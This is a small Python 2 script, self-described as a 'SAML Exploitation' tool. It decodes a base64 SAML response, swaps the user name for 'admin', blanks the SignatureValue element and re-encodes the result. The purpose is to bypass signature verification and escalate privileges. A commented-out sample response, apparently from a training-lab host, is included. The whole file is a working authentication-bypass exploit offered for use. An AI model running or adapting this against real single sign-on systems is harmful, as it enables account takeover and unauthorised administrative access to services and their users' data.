import urllib
import base64
import re
import sys

def usage():
	print " ____        _         _   _      ____  "
	print "| __ )  ___ | | ___ __| \ | |_ __| __ ) "
	print "|  _ \ / _ \| |/ / '__|  \| | '__|  _ \ "
	print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
	print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
	print " "
	print " "
	print " Usage()"
	print "This script is used for SAML Exploitation"
	print "It will decrypt the SAML Base64Request and change the values like: NameID and SignatureValue due to bypass the user restrictions"
	print "python SAML_SignStrip.py"

def main():
	if not len(sys.argv[1:]):
		usage()
	else:
		exploit()

def exploit():
	#SAMLString = "PHNhbWxwOlJlc3BvbnNlIElEPSJfNzZiZTFkNzAtMjZmMy0wMTM3LTVkNmYtMDI0MmFjMTEwMDBhIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxOS0wMy0xMlQxMjo1MToyM1oiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTU1NzQ1YzNlLTdmMDFiMmViLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfNDJiMWIzMTUtYTI1Ni00MjUwLWFmMWEtZDdkZDVhNjdlZWQxIiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vcHRsLTdmOTQ3OTg5LTExYzdkMjQ3LmxpYmN1cmwuc28vc2FtbC9hdXRoPC9Jc3N1ZXI%2BPHNhbWxwOlN0YXR1cz48c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8%2BPC9zYW1scDpTdGF0dXM%2BPEFzc2VydGlvbiB4bWxucz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgSUQ9Il83NmJlMWYxMC0yNmYzLTAxMzctNWQ2Zi0wMjQyYWMxMTAwMGEiIElzc3VlSW5zdGFudD0iMjAxOS0wMy0xMlQxMjo1MToyM1oiIFZlcnNpb249IjIuMCI%2BPElzc3Vlcj5odHRwOi8vcHRsLTdmOTQ3OTg5LTExYzdkMjQ3LmxpYmN1cmwuc28vc2FtbC9hdXRoPC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8geG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIj48L2RzOkNhbm9uaWNhbGl6YXRpb25NZXRob2Q%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZHNpZy1tb3JlI3JzYS1zaGEyNTYiPjwvZHM6U2lnbmF0dXJlTWV0aG9kPjxkczpSZWZlcmVuY2UgVVJJPSIjXzc2YmUxZjEwLTI2ZjMtMDEzNy01ZDZmLTAyNDJhYzExMDAwYSI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIj48L2RzOlRyYW5zZm9ybT48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIj48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jI3NoYTI1NiI%2BPC9kczpEaWdlc3RNZXRob2Q%2BPGRzOkRpZ2VzdFZhbHVlPndCSGN6U0dLbDZJNFQvaE5HcUVMSTlNRzNhYUhwK1lyb0Fqd0o2R2hzQkU9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPlMyY0U1eVhvbjh3QlhEdHVMRTNydEhteklBQXl4KzhUZlAwUmQ1NGFnZFhkMld0bWZDOWR6TTFZSVo3SWlvUHN0MUpCaUs1bVIwbGtGbXlPL2EyTXVpTC81Tm9RSFFSYkNSbmpkMnBrSzlXelJlKzNIWFltWENIQlBGMnJ6R2p6NXJpZmxJVDRyZUptdTQ3MFpoTG5nVmZpQXVvb3NTa3diVVo5ZUNiejc1OD08L2RzOlNpZ25hdHVyZVZhbHVlPjxLZXlJbmZvIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6WDUwOURhdGE%2BPGRzOlg1MDlDZXJ0aWZpY2F0ZT5NSUlEcXpDQ0F4U2dBd0lCQWdJQkFUQU5CZ2txaGtpRzl3MEJBUXNGQURDQmhqRUxNQWtHQTFVRUJoTUNRVlV4RERBS0JnTlZCQWdUQTA1VFZ6RVBNQTBHQTFVRUJ4TUdVM2xrYm1WNU1Rd3dDZ1lEVlFRS0RBTlFTVlF4Q1RBSEJnTlZCQXNNQURFWU1CWUdBMVVFQXd3UGJHRjNjbVZ1WTJWd2FYUXVZMjl0TVNVd0l3WUpLb1pJaHZjTkFRa0JEQlpzWVhkeVpXNWpaUzV3YVhSQVoyMWhhV3d1WTI5dE1CNFhEVEV5TURReU9EQXlNakl5T0ZvWERUTXlNRFF5TXpBeU1qSXlPRm93Z1lZeEN6QUpCZ05WQkFZVEFrRlZNUXd3Q2dZRFZRUUlFd05PVTFjeER6QU5CZ05WQkFjVEJsTjVaRzVsZVRFTU1Bb0dBMVVFQ2d3RFVFbFVNUWt3QndZRFZRUUxEQUF4R0RBV0JnTlZCQU1NRDJ4aGQzSmxibU5sY0dsMExtTnZiVEVsTUNNR0NTcUdTSWIzRFFFSkFRd1diR0YzY21WdVkyVXVjR2wwUUdkdFlXbHNMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQXVCeXdQTmxDMUZvcEdMWWZGOTZTb3RpSzhOajYvblcwODRPNG9tUk1pZnp5N3g5NTVSTEV5NjczcTJhaUpOQjNMdkU2WHZrdDljR3R4dE5vT1h3MWcyVXZIS3BsZFFicjZiT0VqTE5lRE5XN2owb2IrSnJSdkFVT0s5Q1JnZHl3NU1DNmx3cVZRUTVDMURuYVQvMmZTQkZqYXNCRlRSMjRkRXBmVHk4SGZLRUNBd0VBQWFPQ0FTVXdnZ0VoTUFrR0ExVWRFd1FDTUFBd0N3WURWUjBQQkFRREFnVWdNQjBHQTFVZERnUVdCQlFOQkdtbXQzeXRLcGNKYUJhWU5ibnlVMnhrYXpBVEJnTlZIU1VFRERBS0JnZ3JCZ0VGQlFjREFUQWRCZ2xnaGtnQmh2aENBUTBFRUJZT1ZHVnpkQ0JZTlRBNUlHTmxjblF3Z2JNR0ExVWRJd1NCcXpDQnFJQVVEUVJwcHJkOHJTcVhDV2dXbURXNThsTnNaR3VoZ1l5a2dZa3dnWVl4Q3pBSkJnTlZCQVlUQWtGVk1Rd3dDZ1lEVlFRSUV3Tk9VMWN4RHpBTkJnTlZCQWNUQmxONVpHNWxlVEVNTUFvR0ExVUVDZ3dEVUVsVU1Ra3dCd1lEVlFRTERBQXhHREFXQmdOVkJBTU1EMnhoZDNKbGJtTmxjR2wwTG1OdmJURWxNQ01HQ1NxR1NJYjNEUUVKQVF3V2JHRjNjbVZ1WTJVdWNHbDBRR2R0WVdsc0xtTnZiWUlCQVRBTkJna3Foa2lHOXcwQkFRc0ZBQU9CZ1FBRWNWVVBCWDd1Wm16cVpKZnkrdFVQT1Q1SW1OUWo4VkUybGVyaG5Gam5HUEhtSElxaHB6Z253SFF1akpmcy9hMzA5V201cXdjQ2FDMWVPNWNXamNHMHgzT2pkbGxzZ1lEYXRsNUdBdW10Qng4SjNOaFdScU5VZ2l0Q0lrUWx4SEl3VWZnUWFDdXNoWWdEREw1WWJJUWErK2VnQ2dwSVorVDBEajVvUmV3Ly9BPT08L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI%2BYm9rYW5yYkBsaWJjdXJsLnNvPC9OYW1lSUQ%2BPFN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgSW5SZXNwb25zZVRvPSJfNDJiMWIzMTUtYTI1Ni00MjUwLWFmMWEtZDdkZDVhNjdlZWQxIiBOb3RPbk9yQWZ0ZXI9IjIwMTktMDMtMTJUMTI6NTQ6MjNaIiBSZWNpcGllbnQ9Imh0dHA6Ly9wdGwtNTU3NDVjM2UtN2YwMWIyZWIubGliY3VybC5zbzo4MC9zYW1sL2NvbnN1bWUiPjwvU3ViamVjdENvbmZpcm1hdGlvbkRhdGE%2BPC9TdWJqZWN0Q29uZmlybWF0aW9uPjwvU3ViamVjdD48Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMTktMDMtMTJUMTI6NTE6MThaIiBOb3RPbk9yQWZ0ZXI9IjIwMTktMDMtMTJUMTM6NTE6MjNaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cDovL3B0bC01NTc0NWMzZS03ZjAxYjJlYi5saWJjdXJsLnNvOjgwL3NhbWwvYXV0aDwvQXVkaWVuY2U%2BPC9BdWRpZW5jZVJlc3RyaWN0aW9uPjwvQ29uZGl0aW9ucz48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDE5LTAzLTEyVDEyOjUxOjIzWiIgU2Vzc2lvbkluZGV4PSJfNzZiZTFmMTAtMjZmMy0wMTM3LTVkNmYtMDI0MmFjMTEwMDBhIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D"
	SAMLString = sys.argv[1]
	SAMLuri = urllib.unquote(SAMLString)
	SAMLdecode = base64.standard_b64decode(SAMLuri).replace("bokanrb","admin")
	strip_sign = re.sub(r"<ds:SignatureValue>.*</ds:SignatureValue>","<ds:SignatureValue></ds:SignatureValue>",SAMLdecode)
	SAMLencode = base64.standard_b64encode(strip_sign)
	print urllib.quote(SAMLencode)
	
if __name__ == "__main__":
		main()



